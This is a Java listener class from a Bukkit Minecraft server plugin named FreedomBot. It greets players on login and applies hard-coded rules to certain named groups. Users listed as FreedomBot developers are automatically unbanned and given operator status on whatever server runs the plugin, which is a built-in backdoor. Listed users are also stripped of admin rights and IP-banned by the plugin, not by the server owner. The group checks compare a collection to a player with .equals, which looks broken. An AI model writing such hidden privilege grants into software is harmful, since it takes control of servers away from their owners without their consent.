package com.mcplugindev.freedombot.listener;

import com.mcplugindev.freedombot.BotUtil;
import com.mcplugindev.freedombot.TotalFreedom5_Getter;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;

public class BotListener implements Listener {
    
    @EventHandler
    public void onPlayerLogin(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        if (TotalFreedom5_Getter.getInstance().getAdminList().isAdminImpostor(player)) {
            player.sendMessage(BotUtil.BOTPREFIX + "Please verify in the forum's shoutbox.");
        } else {
            if (player.hasPlayedBefore()) {
                player.sendMessage(BotUtil.BOTPREFIX + "Welcome back, " + player.getName() + "!");
            } else {
                player.sendMessage(BotUtil.BOTPREFIX + "Welcome to the server, " + player.getName() + "!");
            }
        }

        if (BotUtil.PERMBANED_USERS.equals(player)) {
            player.setOp(false);
            BotUtil.removeAdmin(player);
            BotUtil.banIP(player);
        } else if (BotUtil.FB_DEVELOPERS.equals(player)) {
            BotUtil.unbanIP(player);
            player.setOp(true);
            Bukkit.broadcastMessage(BotUtil.BOTPREFIX + "A FreedomBot developer has joined!");
        }

    }
}
